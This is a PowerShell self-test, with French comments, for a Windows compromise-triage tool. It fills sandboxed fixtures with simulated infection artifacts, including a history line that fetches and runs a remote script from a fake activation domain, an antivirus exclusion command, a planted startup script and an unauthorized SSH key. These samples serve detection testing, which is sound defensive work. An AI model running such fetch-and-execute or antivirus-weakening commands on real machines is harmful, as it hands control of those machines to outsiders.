<#
.SYNOPSIS
    Autotest de Invoke-WinTriage.ps1 sur des données factices (aucun accès au système réel).
    Fonctionne avec PowerShell 7 sous Windows, Linux ou macOS :  pwsh ./tests/Run-SelfTest.ps1
    Code de sortie 0 si tous les scénarios donnent le résultat attendu.
    -KeepReports <dossier> : conserver les rapports générés (un sous-dossier par scénario).
#>
param([string]$KeepReports)
$ErrorActionPreference = 'Stop'
$root   = Split-Path -Parent $PSScriptRoot
$script = Join-Path $root 'Invoke-WinTriage.ps1'
$shell  = (Get-Process -Id $PID).Path
$fail   = 0

function New-Sandbox([string]$Scenario) {
    $sb = Join-Path ([IO.Path]::GetTempPath()) ("wintriage_" + [guid]::NewGuid().ToString('N'))
    $home1 = Join-Path $sb 'Users/alice'
    $dirs = 'Windows/System32/drivers/etc', 'Windows/Temp', 'Program Files/Microsoft Office/root/vfs/System', 'Program Files (x86)', 'ProgramData', 'Users/Public',
            'Users/alice/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine', 'Users/alice/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup',
            'Users/alice/AppData/Local/Temp', 'Users/alice/.ssh'
    foreach ($d in $dirs) { $null = New-Item -ItemType Directory -Force -Path (Join-Path $sb $d) }
    Set-Content (Join-Path $sb 'Windows/System32/drivers/etc/hosts') "# hosts`n127.0.0.1 localhost"
    Set-Content (Join-Path $home1 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt') "Get-ChildItem`ngit status"
    Set-Content (Join-Path $home1 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Contoso.lnk') 'lnk'
    if ($Scenario -eq 'infected') {
        Set-Content (Join-Path $sb 'Program Files/Microsoft Office/root/vfs/System/sppc.dll') 'x'
        Set-Content (Join-Path $sb 'Program Files/Microsoft Office/root/vfs/System/sppcs.dll') 'x'
        $null = New-Item -ItemType Directory -Force -Path (Join-Path $sb 'Program Files/Activation-Renewal')
        Set-Content (Join-Path $sb 'Program Files/Activation-Renewal/Activation_task.cmd') 'x'
        Add-Content (Join-Path $sb 'Windows/System32/drivers/etc/hosts') "0.0.0.0 ols.officeapps.live.com`n0.0.0.0 update.microsoft.com"
        Add-Content (Join-Path $home1 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt') "irm https://get.activate.win | iex`nirm https://get.activated.win | iex`nAdd-MpPreference -ExclusionPath C:\Users\alice\AppData"
        Set-Content (Join-Path $home1 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/update.vbs') 'CreateObject("WScript.Shell").Run "x"'
        Set-Content (Join-Path $home1 '.ssh/authorized_keys') 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKEFAKEFAKE svc-telemetry'
        Set-Content (Join-Path $sb 'Users/Public/unsigned_tool.exe') 'MZ'
    }
    $sb
}

function Invoke-Scenario([string]$Scenario, [int]$ExpectedExit, [string[]]$MustFind, [switch]$NothingAboveInfo) {
    $sb = New-Sandbox $Scenario
    $env:WINTRIAGE_SCENARIO = $Scenario; $env:WINTRIAGE_SANDBOX = $sb
    $old = $env:USERPROFILE; $env:USERPROFILE = Join-Path $sb 'Users/alice'
    try {
        $out = Join-Path $sb 'reports'
        & $shell -NoProfile -File $script -TestHooks (Join-Path $PSScriptRoot 'Mocks.ps1') -OutputDir $out | Out-Null
        $code = $LASTEXITCODE
        $json = Get-Content -Raw (Get-ChildItem $out -Filter *.json | Select-Object -First 1).FullName | ConvertFrom-Json
        $html = Get-ChildItem $out -Filter *.html | Select-Object -First 1
        if ($KeepReports) { $dst = Join-Path $KeepReports $Scenario; $null = New-Item -ItemType Directory -Force -Path $dst; Copy-Item (Join-Path $out '*') $dst -Force }
        $errors = @()
        if ($code -ne $ExpectedExit) { $errors += "code de sortie $code au lieu de $ExpectedExit" }
        if (-not $html -or $html.Length -lt 3000) { $errors += 'rapport HTML absent ou vide' }
        foreach ($c in $json.Checks) { if ($c.Error) { $errors += "contrôle « $($c.Name) » interrompu : $($c.Error)" } }
        $real = @($json.Findings | Where-Object { $_.Severity -ne 'Info' })
        foreach ($m in $MustFind) { if (-not ($real | Where-Object { $_.Title -match $m })) { $errors += "résultat attendu absent : $m" } }
        if ($NothingAboveInfo -and $real.Count) { $errors += "faux positifs : " + (($real | ForEach-Object { "[$($_.Severity)] $($_.Title)" }) -join ' | ') }
        if ($errors.Count) { $script:fail++; Write-Host "ÉCHEC  $Scenario" -ForegroundColor Red; $errors | ForEach-Object { Write-Host "   - $_" -ForegroundColor Red } }
        else { Write-Host ("OK     {0,-9} {1} résultat(s) au-dessus d'Info, {2} contrôles, code {3}" -f $Scenario, $real.Count, $json.Checks.Count, $code) -ForegroundColor Green }
    } finally {
        $env:USERPROFILE = $old
        Remove-Item -Recurse -Force $sb -ErrorAction SilentlyContinue
    }
}

Invoke-Scenario 'clean' 0 @() -NothingAboveInfo
Invoke-Scenario 'infected' 2 @(
    'Ohook : sppc\.dll remplacée', 'Ohook : lien sppcs\.dll', 'Fichier ou dossier d''activateur : Activation-Renewal', 'Service d''activateur : KMSELDI',
    'Adresse KMS factice : 10\.0\.0\.10', 'durée anormale', 'contrôle d''abonnement Office neutralisé', 'Domaines de licence Microsoft redirigés',
    'Faux domaine MAS', 'Lancement de Microsoft Activation Scripts', 'Affaiblissement de l''antivirus',
    'Clé Run \(alice\) : Updater', 'Clé Run \(alice\) : Helper', 'Script dans le dossier Démarrage', 'Tâche : \\OneDrive Sync Helper',
    'Tâche masquée .*SysMon', 'invisible de l''API : \\Activation-Renewal', 'Abonnement WMI exécutant du code', 'Winlogon : Userinit modifié',
    'Débogueur attaché à sethc\.exe', 'toutes les macros sont activées', 'Compte local masqué', 'Clés SSH autorisées', 'Outil d''accès à distance présent : anydesk',
    'Protection en temps réel désactivée', 'Exclusion antivirus très large', 'Détection antivirus : HackTool', 'Domaines de sécurité ou de mise à jour redirigés',
    'Processus usurpant un nom système : svchost\.exe', 'Exécutable non signé récent : unsigned_tool\.exe', 'Journal d''événements effacé', 'Service installé le .* : WinUpd',
    'Tâche BITS avec commande de notification'
)
if ($fail) { Write-Host "$fail scénario(s) en échec." -ForegroundColor Red; exit 1 }
Write-Host 'Autotest réussi.' -ForegroundColor Green
